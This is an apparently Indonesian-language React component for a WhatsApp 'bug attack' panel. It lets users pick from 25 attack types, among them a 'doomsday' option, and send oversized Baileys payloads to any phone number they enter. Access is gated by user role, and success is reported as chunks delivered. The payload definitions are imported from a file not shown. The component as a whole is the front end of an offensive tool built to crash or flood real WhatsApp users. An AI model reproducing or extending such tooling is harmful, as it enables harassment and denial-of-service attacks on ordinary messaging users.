"use client";
import { useState } from "react";
import { useApp } from "@/contexts/AppContext";
import { ATTACK_MENUS } from "@/lib/bugPayloads";
import SuccessNotification from "./SuccessNotification";
import LockedFeature from "./LockedFeature";

export default function AttackSection() {
  const { token, user } = useApp();
  const [selected, setSelected] = useState<string | null>(null);
  const [target, setTarget] = useState("");
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showLocked, setShowLocked] = useState(false);
  const [error, setError] = useState("");
  const [result, setResult] = useState<any>(null);

  const handleAttack = async () => {
    if (!selected) { setError("Pilih jenis serangan brutal V2 dulu!"); return; }
    if (!target.trim()) { setError("Nomor target tidak boleh kosong! Format: 628xxxx"); return; }
    setError("");
    setLoading(true);
    try {
      const res = await fetch("/api/wa/send", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({ attackType: selected, target }),
      });
      const data = await res.json();
      if (!res.ok) {
        if (data.code === "NOT_CONNECTED") setError(`❌ ${data.error} — Buka menu Pairing WA dulu!`);
        else if (res.status === 403) setShowLocked(true);
        else setError(data.error || "Gagal mengirim serangan real WA");
      } else {
        setResult(data);
        setShowSuccess(true);
      }
    } catch (e: any) {
      setError("Gagal: " + e.message);
    } finally {
      setLoading(false);
    }
  };

  const handleSelectAttack = (id: string, basicAccess: boolean) => {
    if (user?.role === "user" && !basicAccess) { setShowLocked(true); return; }
    setSelected(id === selected ? null : id);
    setError("");
  };

  const selectedMenu = ATTACK_MENUS.find(m => m.id === selected);

  return (
    <>
      {showSuccess && <SuccessNotification onClose={() => setShowSuccess(false)} message={result?.message} />}
      {showLocked && <LockedFeature onClose={() => setShowLocked(false)} />}

      <div className="p-4 max-w-2xl mx-auto">
        <div className="text-center mb-5">
          <h2 className="digital-font text-[18px] font-black bg-gradient-to-br from-white to-[#ff0040] bg-clip-text text-transparent drop-shadow-[0_0_10px_rgba(255,0,64,0.6)]">
            ⚡ 25 BUG ATTACK V2 BRUTAL — REAL BAILEYS 120FPS
          </h2>
          <p className="digital-font text-white/50 text-[9px] tracking-[1px] mt-1">PAYLOAD HITAM-PUTIH-MERAH NEON • 100% REAL WA • 120FPS SMOOTH</p>
        </div>

        <div className="grid grid-cols-1 gap-2 mb-4 max-h-[42vh] overflow-y-auto scrollbar-hide">
          {ATTACK_MENUS.map((menu) => {
            const isLocked = user?.role === "user" && !menu.basicAccess;
            const isSelected = selected === menu.id;
            const isDoomsday = menu.id === "doomsday-ultimate";
            return (
              <button
                key={menu.id}
                onClick={() => handleSelectAttack(menu.id, menu.basicAccess)}
                className="flex items-center gap-2.5 px-3 py-2.5 rounded-[9px] border text-left transition-all"
                style={{
                  borderColor: isSelected ? (isDoomsday ? "#ffffff" : "#ff0040") : isLocked ? "rgba(255,255,255,0.05)" : "rgba(255,255,255,0.08)",
                  background: isSelected ? (isDoomsday ? "linear-gradient(135deg, rgba(255,255,255,0.12), rgba(255,0,64,0.18))" : "linear-gradient(135deg, rgba(255,0,64,0.15), rgba(0,0,0,0.7))") : isLocked ? "rgba(0,0,0,0.2)" : "rgba(0,0,0,0.4)",
                  opacity: isLocked ? 0.45 : 1,
                  boxShadow: isSelected && isDoomsday ? "0 0 20px rgba(255,255,255,0.2), 0 0 30px rgba(255,0,64,0.2)" : isSelected ? "0 0 15px rgba(255,0,64,0.25)" : "none",
                }}
              >
                <span className="text-[18px] shrink-0" style={{ filter: isSelected ? "drop-shadow(0 0 6px #ff0040)" : "none" }}>{menu.icon}</span>
                <div className="flex-1 min-w-0">
                  <p className={`${isSelected ? "digital-font" : ""} text-[11px] font-bold m-0 whitespace-nowrap overflow-hidden text-ellipsis`} style={{ color: isLocked ? "rgba(255,255,255,0.3)" : isDoomsday ? "#fff" : isSelected ? "#fff" : "#ffffffcc", fontSize: isSelected ? "10px" : "11px" }}>
                    {isLocked ? "🔒 " : ""}{menu.name} {isDoomsday ? "☢️" : ""}
                  </p>
                  <p className="text-[9px] mt-0.5 leading-[1.3] whitespace-nowrap overflow-hidden text-ellipsis" style={{ color: isSelected ? "#ff9999" : "rgba(255,255,255,0.4)" }}>{menu.desc}</p>
                </div>
                {isSelected && <span className="text-[#ff0040] text-sm shrink-0 drop-shadow-[0_0_8px_#ff0040]">✓</span>}
                {isDoomsday && !isSelected && <span className="text-[10px] bg-[#ff0040] text-white px-1.5 py-0.5 rounded font-extrabold">NUKLIR</span>}
              </button>
            );
          })}
        </div>

        {selectedMenu && (
          <div className="bg-gradient-to-br from-[rgba(255,0,64,0.08)] to-black/60 border border-[rgba(255,0,64,0.25)] border-l-[3px] border-l-[#ff0040] rounded-lg p-3 mb-3.5">
            <p className="digital-font text-white text-[10px] font-bold m-0 mb-1">{selectedMenu.icon} SELECTED V2: {selectedMenu.name}</p>
            <p className="text-[#ffaaaa] text-[10px] m-0 leading-[1.4]">{selectedMenu.desc}</p>
            <p className="digital-font text-white/40 text-[8px] mt-1.5">REAL BAILEYS • {selectedMenu.id === "doomsday-ultimate" ? "5 CHUNKS • 150K+ CHARS" : "HEAVY PAYLOAD V2"} • 120FPS</p>
          </div>
        )}

        <div className="glass-card-black-red rounded-xl p-[18px]">
          <label className="digital-font text-white text-[10px] tracking-[1px] block mb-2">NOMOR TARGET REAL WA — FORMAT 628XXXXXXXXXX</label>
          <input type="tel" value={target} onChange={(e) => setTarget(e.target.value)} placeholder="6281234567890 — nomor penipu target" className="w-full bg-black/70 border border-[rgba(255,0,64,0.35)] rounded-lg px-4 py-3 text-white text-[15px] tracking-[1px] mb-3.5 shadow-[inset_0_0_12px_rgba(0,0,0,0.6)]" />

          {error && <div className="bg-[rgba(255,0,64,0.12)] border border-[rgba(255,0,64,0.4)] rounded-lg p-2.5 text-[#ff5566] text-[11px] mb-3.5 text-center shadow-[0_0_10px_rgba(255,0,64,0.15)]">{error}</div>}

          {result && result.sent !== undefined && (
            <div className="bg-white/5 border border-white/10 rounded-lg px-3 py-2 mb-3 flex justify-between">
              <span className="digital-font text-white/50 text-[9px]">REAL WA TERKIRIM</span>
              <span className="digital-font text-[#00ff88] text-[9px] font-bold">{result.sent}/{result.total} CHUNKS — {result.jid}</span>
            </div>
          )}

          <button onClick={handleAttack} disabled={loading || !selected} className="btn-gas-black-red w-full rounded-xl py-[15px] text-white text-sm font-black tracking-[1px] shadow-[0_0_20px_rgba(255,0,64,0.3)] disabled:opacity-55 disabled:cursor-not-allowed text-shadow-[0_0_10px_rgba(255,255,255,0.9)]">
            {loading ? "⏳ MENGIRIM REAL BAILEYS HEAVY PAYLOAD..." : "🔥 GAS TEKAN TOMBOL INI MBUD — KIRIM BUG REAL WA 💀🔥"}
          </button>

          <p className="digital-font text-white/25 text-[8px] text-center mt-2.5 leading-[1.4]">REAL @whiskeysockets/baileys v6.7.18 • 120FPS SMOOTH • Payload 20k+ • No Lag</p>
        </div>
      </div>
    </>
  );
}
